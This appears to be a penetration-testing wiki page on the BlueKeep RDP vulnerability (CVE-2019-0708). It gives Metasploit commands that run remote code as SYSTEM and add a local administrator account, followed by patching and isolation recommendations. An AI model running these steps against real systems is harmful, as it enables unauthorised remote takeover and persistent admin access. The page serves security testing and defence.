---
layout: default
title: BlueKeep [CVE-2019-0708]
parent: Windows
nav_order: 1
permalink: /windows/bluekeep/
---

# BlueKeep [CVE-2019-0708]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Prerequisites

- Windows 7 SP1 or 2008 R2 domain computer.

## Exploit

TODO: scan using https://github.com/robertdavidgraham/rdpscan

Then, to exploit vulnerable targets, run following commands using `Metasploit`.

```bash
# Start metasploit
msfconsole

# Look for eternalblue exploit
search bluekeep

# Take (exploit/windows/rdp/cve_2019_0708_bluekeep_rce)
use 1

# Take payload (windows/x64/exec)
show payloads
set payload 19

# Setup the exploit to check exploitability (should return local\SYSTEM)
set CMD whoami
set RHOSTS $TARGET
run

# To gain administrative access
set CMD net user $USERNAME $PASSWORD /add; net localgroup Administrators $USERNAME /add
run
```

## Recommendations

- [ ]  Update Windows computers to a supported version by Microsoft.
- [ ]  Remove vulnerable Windows computers from the domain to put them in WORKGROUP.
- [ ]  Isolate vulnerable Windows computers in a dedicated sub-network and restrict its access.